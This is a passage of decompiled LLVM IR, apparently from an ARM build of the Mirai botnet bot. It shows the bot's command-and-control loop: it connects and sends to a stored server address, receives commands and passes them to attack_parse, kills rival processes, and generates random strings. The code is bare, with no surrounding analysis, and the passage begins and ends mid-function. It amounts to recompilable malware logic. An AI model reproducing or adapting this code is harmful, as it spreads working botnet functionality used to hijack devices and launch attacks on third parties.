  store i32 %v1_de50, i32* @r2, align 4
  %v0_de54 = load i32, i32* @r5, align 4
  %v2_de58 = call i32 @__libc_fcntl(i32 %v0_de54, i32 4)
  %v2_de60 = load i32, i32* @global_var_21a90.84, align 4
  store i32 %v2_de60, i32* %r3.global-to-local, align 4
  %v2_de64 = icmp eq i32 %v2_de60, 0
  br i1 %v2_de64, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_de40
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_de40, %bb42
  %v2_de6c = xor i1 %v2_de64, true
  call void @__pseudo_cond_branch(i1 %v2_de6c, i32 ptrtoint (i32* @global_var_10618.113 to i32))
  store i32 ptrtoint (i8** @global_var_21c0c.110 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_de78 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_21c0c.110 to i8*), align 4
  %v4_de88 = call i32 @__libc_connect(i32 %v2_de78, i32 ptrtoint (i16** @global_var_24728.93 to i32), i32 16)
  br label %dec_label_pc_dc08

dec_label_pc_de90:                                ; preds = %dec_label_pc_dc90
  %v2_de94 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_dea4 = call i32 @__libc_send(i32 %v2_de94, i32 %v2_de98, i32 2, i32 16384)
  br label %dec_label_pc_dcc4

dec_label_pc_deac:                                ; preds = %dec_label_pc_dd08
  store i32 4, i32* @r4, align 4
  store i32 %v2_deb4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_de90, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_ded0 = call i32 @getsockopt(i32 %v2_dd88, i32 1, i32 4, i32 %v2_deb4, i32 %v2_de90)
  %v3_ded4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ded4, i32* %r3.global-to-local, align 4
  %v2_ded8 = icmp eq i32 %v3_ded4, 0
  br i1 %v2_ded8, label %dec_label_pc_df60, label %dec_label_pc_dee0

dec_label_pc_dee0:                                ; preds = %dec_label_pc_deac
  %v2_dee0 = load i32, i32* @global_var_21a8c.107, align 4
  %v1_dee4 = call i32 @__GI___libc_close(i32 %v2_dee0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_deec = load i32, i32* @r5, align 4
  %v2_deec = inttoptr i32 %v1_deec to i32*
  store i32 -1, i32* %v2_deec, align 4
  %v0_def0 = call i32 @rand_next()
  %v3_def8 = zext i32 %v0_def0 to i64
  %v4_def8 = mul nuw i64 %v3_def8, 3435973837
  %v7_def8 = trunc i64 %v4_def8 to i32
  store i32 %v7_def8, i32* %ip.global-to-local, align 4
  %v3_defc2 = udiv i64 %v4_def8, 34359738368
  %v3_df004 = mul nuw nsw i64 %v3_defc2, 8
  %v3_df00 = trunc i64 %v3_df004 to i32
  store i32 %v3_df00, i32* %r2.global-to-local, align 4
  %v2_df046 = mul nuw nsw i64 %v3_defc2, 2
  %v2_df04 = trunc i64 %v2_df046 to i32
  %v2_df08 = add i32 %v3_df00, %v2_df04
  store i32 %v2_df08, i32* %r3.global-to-local, align 4
  %v2_df0c = sub i32 %v0_def0, %v2_df08
  %v1_df10 = add i32 %v2_df0c, 1
  %v1_df14 = call i32 @sleep(i32 %v1_df10)
  br label %dec_label_pc_db88

dec_label_pc_df1c:                                ; preds = %dec_label_pc_dcd4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_deb4, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_df30 = call i32 @__libc_accept(i32 %v2_dcc8, i32 %v2_df28, i32 %v2_deb4, i32 16, i32 16)
  %v1_df34 = call i32 @killer_kill(i32 %v5_df30)
  %v2_df44 = call i32 @kill(i32 %v1_df40, i32 9)
  store i32 ptrtoint (i32* @global_var_21c08.97 to i32), i32* %r3.global-to-local, align 4
  %v2_df4c = load i32, i32* @global_var_21c08.97, align 4
  %v2_df50 = icmp eq i32 %v2_df4c, 0
  br i1 %v2_df50, label %dec_label_pc_df58, label %dec_label_pc_dff8

dec_label_pc_df58:                                ; preds = %dec_label_pc_df1c, %dec_label_pc_dff8
  %v1_df5c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %dec_label_pc_deac, %dec_label_pc_df58
  %v2_df64 = call i32 @util_strlen(i8* %v1_df64)
  %sext = mul i32 %v2_df64, 16777216
  %v1_df68 = sdiv i32 %sext, 16777216
  %v7_df68 = inttoptr i32 %v1_df68 to i8*
  store i8* %v7_df68, i8** %stack_var_-42, align 4
  %v0_df6c = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* @lr, align 4
  %v0_df74 = load i32, i32* @r4, align 4
  store i32 %v0_df74, i32* %r2.global-to-local, align 4
  store i32 %v0_df6c, i32* @global_var_2471c.58, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_df84 = load i32, i32* @r5, align 4
  %v1_df84 = inttoptr i32 %v0_df84 to i32*
  %v2_df84 = load i32, i32* %v1_df84, align 4
  %v4_df88 = call i32 @__libc_send(i32 %v2_df84, i32 ptrtoint (i32* @global_var_19280.117 to i32), i32 %v0_df74, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_df94 = load i32, i32* @r5, align 4
  %v1_df94 = inttoptr i32 %v0_df94 to i32*
  %v2_df94 = load i32, i32* %v1_df94, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_dfa0 = call i32 @__libc_send(i32 %v2_df94, i32 %v2_de98, i32 1, i32 16384)
  %v3_dfa4 = load i8*, i8** %stack_var_-42, align 4
  %v4_dfa4 = ptrtoint i8* %v3_dfa4 to i32
  store i32 %v4_dfa4, i32* %r2.global-to-local, align 4
  %v3_dfa8 = icmp eq i8* %v3_dfa4, null
  br i1 %v3_dfa8, label %dec_label_pc_db88, label %dec_label_pc_dfb0

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_df60
  %v0_dfb0 = load i32, i32* @r5, align 4
  %v1_dfb0 = inttoptr i32 %v0_dfb0 to i32*
  %v2_dfb0 = load i32, i32* %v1_dfb0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_dfbc = call i32 @__libc_send(i32 %v2_dfb0, i32 %v2_d9c4, i32 %v4_dfa4, i32 16384)
  br label %dec_label_pc_db88

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_e034, %dec_label_pc_ddbc
  %v0_dfc4 = load i32, i32* @r5, align 4
  %v1_dfc4 = inttoptr i32 %v0_dfc4 to i32*
  %v2_dfc4 = load i32, i32* %v1_dfc4, align 4
  store i32 %v2_dfc4, i32* %r3.global-to-local, align 4
  %v7_dfc8 = icmp eq i32 %v2_dfc4, 4
  br i1 %v7_dfc8, label %dec_label_pc_db88, label %bb44

bb44:                                             ; preds = %dec_label_pc_dfc4
  %v8_dfcc = icmp eq i32 %v2_dfc4, 11
  br i1 %v8_dfcc, label %dec_label_pc_db88, label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_e058, %bb44, %dec_label_pc_ddf0
  %v2_dfd4 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 57312, i32* @lr, align 4
  %v1_dfdc = icmp ne i32 %v2_dfd4, -1
  call void @__pseudo_cond_branch(i1 %v1_dfdc, i32 ptrtoint (i32* @global_var_14250.112 to i32))
  store i32 ptrtoint (i32* @global_var_21a8c.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21a8c.107, align 4
  %v1_dff0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db88

dec_label_pc_dff8:                                ; preds = %dec_label_pc_df1c
  %v2_dffc = call i32 @kill(i32 %v2_df4c, i32 9)
  br label %dec_label_pc_df58

dec_label_pc_e004:                                ; preds = %dec_label_pc_ddf8
  %v3_e004 = udiv i32 %v4_ddfc, 256
  %v1_e008 = urem i32 %v4_ddfc, 256
  store i32 %v1_e008, i32* %r3.global-to-local, align 4
  %v4_e00c = mul nuw nsw i32 %v1_e008, 256
  %v5_e00c = or i32 %v4_e00c, %v3_e004
  %v6_e00c = trunc i32 %v5_e00c to i16
  store i32 %v5_e00c, i32* %r2.global-to-local, align 4
  store i32 %v2_dcb4, i32* @lr, align 4
  %v7_e018 = inttoptr i32 %v5_e00c to i8*
  store i8* %v7_e018, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e00c, 1025
  br i1 %tmp45, label %dec_label_pc_e034, label %dec_label_pc_e020

dec_label_pc_e020:                                ; preds = %dec_label_pc_e004
  %v2_e020 = load i32, i32* @global_var_21a8c.107, align 4
  %v1_e024 = call i32 @__GI___libc_close(i32 %v2_e020)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e02c = load i32, i32* @r8, align 4
  %v2_e02c = inttoptr i32 %v1_e02c to i32*
  store i32 -1, i32* %v2_e02c, align 4
  br label %dec_label_pc_db88

dec_label_pc_e034:                                ; preds = %dec_label_pc_e004
  %v0_e034 = load i32, i32* @r4, align 4
  %v1_e034 = load i32, i32* @r5, align 4
  %v2_e034 = inttoptr i32 %v1_e034 to i32*
  store i32 %v0_e034, i32* %v2_e034, align 4
  store i32 %v2_e03c, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e044 = load i32, i32* @global_var_21a8c.107, align 4
  %v7_e04c = call i32 @__libc_recv(i32 %v2_e044, i32 %v2_e03c, i32 %v5_e00c, i32 16386)
  %v7_e050 = icmp eq i32 %v7_e04c, -1
  br i1 %v7_e050, label %dec_label_pc_dfc4, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e034
  %v2_e058 = icmp eq i32 %v7_e04c, 0
  br i1 %v2_e058, label %dec_label_pc_dfd4, label %dec_label_pc_e060

dec_label_pc_e060:                                ; preds = %dec_label_pc_e058
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e06c = load i32, i32* @global_var_21a8c.107, align 4
  %v4_e070 = call i32 @__libc_recv(i32 %v2_e06c, i32 %v2_de98, i32 2, i32 16384)
  %v3_e078 = load i8*, i8** %stack_var_-42, align 4
  %v4_e078 = ptrtoint i8* %v3_e078 to i32
  %v3_e07c = udiv i32 %v4_e078, 256
  %v1_e080 = mul i32 %v4_e078, 256
  %v4_e084 = and i32 %v1_e080, 65280
  %v5_e084 = or i32 %v4_e084, %v3_e07c
  store i32 %v5_e084, i32* %ip.global-to-local, align 4
  store i32 %v2_dcb4, i32* @lr, align 4
  store i32 %v5_e084, i32* %r2.global-to-local, align 4
  %v2_e094 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e09c = inttoptr i32 %v5_e084 to i8*
  store i8* %v6_e09c, i8** %stack_var_-42, align 4
  %v6_e0a0 = call i32 @__libc_recv(i32 %v2_e094, i32 %v2_e03c, i32 %v5_e084, i32 16384)
  store i32 %v2_dcb4, i32* %r2.global-to-local, align 4
  %v3_e0a8 = load i8*, i8** %stack_var_-42, align 4
  %v3_e0ac = icmp eq i8* %v3_e0a8, null
  br i1 %v3_e0ac, label %dec_label_pc_db88, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e060
  %v4_e0a8 = ptrtoint i8* %v3_e0a8 to i32
  %v5_e0b8 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e0a8, i32 %v2_dcb4)
  br label %dec_label_pc_db88

; uselistorder directives
  uselistorder i8* %v3_e0a8, { 1, 0 }
  uselistorder i32 %v5_e084, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e04c, { 1, 0 }
  uselistorder i32 %v5_e00c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_de2c, { 1, 3, 2, 0 }
  uselistorder i32 %v4_ddfc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dde4, { 1, 0 }
  uselistorder i32 %v2_dd88, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_dcc8, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_dcb0, { 1, 0, 2 }
  uselistorder i32 %v5_dc7c, { 1, 2, 0 }
  uselistorder i32 %v2_dbc8, { 2, 1, 0 }
  uselistorder i32 %v1_dbb8, { 1, 2, 0 }
  uselistorder i32 %v1_db9c, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_deb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_de98, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_de90, { 1, 0 }
  uselistorder i32 %v2_dcb4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_db84, { 1, 0, 2 }
  uselistorder i32 %v2_da28, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_da14, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_21c08.97, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @kill, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21c0c.110 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21c0c.110 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_21a88.86, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_21a8c.107, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21a90.84, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d7f8.82 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24728.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_df60, { 1, 0 }
  uselistorder label %dec_label_pc_df58, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dcc4, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_dc08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbf8, { 1, 0 }
  uselistorder label %dec_label_pc_db88, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d9e8, { 2, 0, 1 }
}

define i32 @function_e0e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e0e8:
  %v0_e0e8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e0e8, i32 -22312036)
  %v0_e0f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e0e8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e0e8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e104 = load i32, i32* @global_var_21c10.119, align 4
  %v2_e108 = load i32, i32* @global_var_21c1c.121, align 4
  %v4_e114 = mul i32 %v2_e104, 2048
  %v5_e114 = xor i32 %v4_e114, %v2_e104
  store i32 %v5_e114, i32* @r3, align 4
  %v4_e118 = udiv i32 %v2_e108, 524288
  %v5_e118 = xor i32 %v4_e118, %v2_e108
  %v2_e11c = load i32, i32* @global_var_21c14.123, align 4
  %v2_e120 = load i32, i32* @global_var_21c18.125, align 4
  %v2_e124 = xor i32 %v5_e118, %v5_e114
  %v4_e128 = udiv i32 %v5_e114, 256
  %v5_e128 = xor i32 %v2_e124, %v4_e128
  store i32 %v2_e11c, i32* @global_var_21c10.119, align 4
  store i32 %v2_e120, i32* @global_var_21c14.123, align 4
  store i32 %v2_e108, i32* @global_var_21c18.125, align 4
  store i32 %v5_e128, i32* @global_var_21c1c.121, align 4
  ret i32 %v5_e128

; uselistorder directives
  uselistorder i32 %v2_e108, { 2, 1, 0 }
  uselistorder i32 %v2_e104, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e160 = call i32 @__GI_time(i32* null)
  store i32 %v2_e160, i32* @global_var_21c10.119, align 4
  %v1_e16c = call i32 @__getpid(i32 %v2_e160)
  store i32 %v1_e16c, i32* @r0, align 4
  %v0_e174 = call i32 @getppid()
  %v2_e17c = xor i32 %v1_e16c, %v0_e174
  store i32 %v2_e17c, i32* @global_var_21c14.123, align 4
  %v1_e184 = call i32 @clock(i32 %v2_e17c)
  %v2_e188 = load i32, i32* @global_var_21c14.123, align 4
  %v2_e194 = xor i32 %v2_e188, %v1_e184
  store i32 %v2_e194, i32* @global_var_21c1c.121, align 4
  store i32 %v1_e184, i32* @global_var_21c18.125, align 4
  ret i32 %v1_e184

; uselistorder directives
  uselistorder i32 %v1_e184, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e1bc = load i32, i32* @r4, align 4
  %v6_e1bc = load i32, i32* @r5, align 4
  %v9_e1bc = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e1d0 = call i32 @table_unlock_val(i32 31)
  %v3_e1dc = call i32 @table_retrieve_val(i32 31, i32* null)
  store i32 %v3_e1dc, i32* @r1, align 4
  %v2_e1e8 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1e8 = call i32 @strcpy(i8* %v2_e1e8, i32 %v3_e1dc)
  %v2_e1ec = icmp eq i32 %arg2, 0
  br i1 %v2_e1ec, label %dec_label_pc_e268, label %dec_label_pc_e1f4

dec_label_pc_e1f4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21c10.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c14.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c18.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c1c.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e24c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e208

dec_label_pc_e208:                                ; preds = %dec_label_pc_e208.dec_label_pc_e208_crit_edge, %dec_label_pc_e1f4
  %v1_e22c = phi i32 [ %v1_e22c.pre, %dec_label_pc_e208.dec_label_pc_e208_crit_edge ], [ ptrtoint (i32* @global_var_21c10.119 to i32), %dec_label_pc_e1f4 ]
  %v2_e208 = load i32, i32* @global_var_21c1c.121, align 4
  store i32 %v2_e208, i32* %r2.global-to-local, align 4
  %v2_e20c = load i32, i32* @global_var_21c10.119, align 4
  %v4_e210 = udiv i32 %v2_e208, 524288
  %v5_e210 = xor i32 %v4_e210, %v2_e208
  %v4_e214 = mul i32 %v2_e20c, 2048
  %v5_e214 = xor i32 %v4_e214, %v2_e20c
  %v2_e218 = xor i32 %v5_e210, %v5_e214
  %v2_e21c = load i32, i32* @global_var_21c14.123, align 4
  %v2_e220 = load i32, i32* @global_var_21c18.125, align 4
  store i32 %v2_e220, i32* %ip.global-to-local, align 4
  %v4_e224 = udiv i32 %v5_e214, 256
  %v5_e224 = xor i32 %v2_e218, %v4_e224
  store i32 %v5_e224, i32* @r4, align 4
  %v2_e22c = inttoptr i32 %v1_e22c to i32*
  store i32 %v2_e21c, i32* %v2_e22c, align 4
  %v0_e230 = load i32, i32* %ip.global-to-local, align 4
  %v1_e230 = load i32, i32* %r8.global-to-local, align 4
  %v2_e230 = inttoptr i32 %v1_e230 to i32*
  store i32 %v0_e230, i32* %v2_e230, align 4
  %v0_e234 = load i32, i32* %r2.global-to-local, align 4
  %v1_e234 = load i32, i32* %r7.global-to-local, align 4
  %v2_e234 = inttoptr i32 %v1_e234 to i32*
  store i32 %v0_e234, i32* %v2_e234, align 4
  %v0_e238 = load i32, i32* @r4, align 4
  %v1_e238 = load i32, i32* @r6, align 4
  %v2_e238 = inttoptr i32 %v1_e238 to i32*
  store i32 %v0_e238, i32* %v2_e238, align 4
  %v2_e23c = call i32 @util_strlen(i8* %v2_e1e8)
  %v0_e244 = load i32, i32* @r4, align 4
  %v3_e248 = urem i32 %v0_e244, %v2_e23c
  %v2_e250 = add i32 %v3_e248, %v2_e24c
  %v1_e254 = add i32 %v2_e250, -32
  %v2_e254 = inttoptr i32 %v1_e254 to i8*
  %v3_e254 = load i8, i8* %v2_e254, align 1
  %v2_e258 = load i32, i32* @r5, align 4
  %v3_e258 = load i32, i32* %fp.global-to-local, align 4
  %v4_e258 = add i32 %v3_e258, %v2_e258
  %v5_e258 = inttoptr i32 %v4_e258 to i8*
  store i8 %v3_e254, i8* %v5_e258, align 1
  %v0_e25c = load i32, i32* @r5, align 4
  %v1_e25c = add i32 %v0_e25c, 1
  store i32 %v1_e25c, i32* @r5, align 4
  %v1_e260 = load i32, i32* %sb.global-to-local, align 4
  %v9_e260 = icmp eq i32 %v1_e25c, %v1_e260
  br i1 %v9_e260, label %dec_label_pc_e268, label %dec_label_pc_e208.dec_label_pc_e208_crit_edge

dec_label_pc_e208.dec_label_pc_e208_crit_edge:    ; preds = %dec_label_pc_e208
  %v1_e22c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e208

dec_label_pc_e268:                                ; preds = %dec_label_pc_e208, %entry
  %v1_e26c = call i32 @table_lock_val(i32 31)
  store i32 %v3_e1bc, i32* @r4, align 4
  store i32 %v6_e1bc, i32* @r5, align 4
  store i32 %v9_e1bc, i32* @r6, align 4
  ret i32 %v1_e26c

; uselistorder directives
  uselistorder i32 %v2_e20c, { 1, 0 }
  uselistorder i32 %v2_e208, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e28c = load i32, i32* %r1.global-to-local, align 4
  %v3_e290 = load i32, i32* @r4, align 4
  store i32 %v3_e290, i32* %stack_var_-28, align 4
  %v0_e294 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e294, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e28c, 1
  br i1 %tmp16, label %dec_label_pc_e33c, label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21c1c.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c18.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c14.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c10.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e2ac = load i32, i32* @global_var_21c1c.121, align 4
  store i32 %v2_e2ac, i32* %lr.global-to-local, align 4
  %v2_e2b0 = load i32, i32* @global_var_21c18.125, align 4
  store i32 %v2_e2b0, i32* %r4.global-to-local, align 4
  %v2_e2b4 = load i32, i32* @global_var_21c14.123, align 4
  store i32 %v2_e2b4, i32* %r0.global-to-local, align 4
  %v2_e2b8 = load i32, i32* @global_var_21c10.119, align 4
  br label %dec_label_pc_e2dc

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e2fc
  %v1_e2c0 = trunc i32 %v5_e2ec to i16
  %v3_e2c0 = inttoptr i32 %v9_e2f0 to i16*
  store i16 %v1_e2c0, i16* %v3_e2c0, align 2
  %v4_e2c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_e2c0 = add i32 %v4_e2c0, -2
  store i32 %v5_e2c0, i32* %r5.global-to-local, align 4
  %v0_e2c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %.thread, %dec_label_pc_e2c0
  %v0_e2c4 = phi i32 [ %v9_e2f4, %.thread ], [ %v0_e2c4.pre, %dec_label_pc_e2c0 ]
  %v2_e2c05 = phi i32 [ %v12_e2f0, %.thread ], [ %v5_e2c0, %dec_label_pc_e2c0 ]
  %tmp17 = icmp slt i32 %v0_e2c4, 1
  br i1 %tmp17, label %dec_label_pc_e344, label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e2c4
  %v0_e2c8 = load i32, i32* %r0.global-to-local, align 4
  %v0_e2d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2d0, i32* %r0.global-to-local, align 4
  %v0_e2d4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e2d4, i32* %r4.global-to-local, align 4
  %v0_e2d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e2d8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e29c, %dec_label_pc_e2d0
  %v0_e328 = phi i32 [ %v2_e2b4, %dec_label_pc_e29c ], [ %v0_e2d0, %dec_label_pc_e2d0 ]
  %v9_e2f0 = phi i32 [ %v0_e294, %dec_label_pc_e29c ], [ %v2_e2c05, %dec_label_pc_e2d0 ]
  %v0_e308 = phi i32 [ %v0_e28c, %dec_label_pc_e29c ], [ %v0_e2c4, %dec_label_pc_e2d0 ]
  %v0_e31c = phi i32 [ %v2_e2ac, %dec_label_pc_e29c ], [ %v0_e2d8, %dec_label_pc_e2d0 ]
  %v0_e318 = phi i32 [ %v2_e2b8, %dec_label_pc_e29c ], [ %v0_e2c8, %dec_label_pc_e2d0 ]
  %v4_e2dc = mul i32 %v0_e318, 2048
  %v5_e2dc = xor i32 %v4_e2dc, %v0_e318
  %v4_e2e0 = udiv i32 %v0_e31c, 524288
  %v5_e2e0 = xor i32 %v4_e2e0, %v0_e31c
  %v2_e2e4 = xor i32 %v5_e2e0, %v5_e2dc
  %v4_e2ec = udiv i32 %v5_e2dc, 256
  %v5_e2ec = xor i32 %v2_e2e4, %v4_e2ec
  store i32 %v5_e2ec, i32* %r3.global-to-local, align 4
  %v7_e2f0 = icmp sgt i32 %v0_e308, 3
  br i1 %v7_e2f0, label %.thread, label %dec_label_pc_e2fc

.thread:                                          ; preds = %dec_label_pc_e2dc
  %v10_e2f0 = inttoptr i32 %v9_e2f0 to i32*
  store i32 %v5_e2ec, i32* %v10_e2f0, align 4
  %v11_e2f0 = load i32, i32* %r5.global-to-local, align 4
  %v12_e2f0 = add i32 %v11_e2f0, 4
  store i32 %v12_e2f0, i32* %r5.global-to-local, align 4
  %v8_e2f4 = load i32, i32* %r1.global-to-local, align 4
  %v9_e2f4 = add i32 %v8_e2f4, -4
  store i32 %v9_e2f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2dc
  %v7_e308 = icmp eq i32 %v0_e308, 1
  store i32 %v5_e2ec, i32* %r3.global-to-local, align 4
  %v1_e310 = add i32 %v0_e308, -2
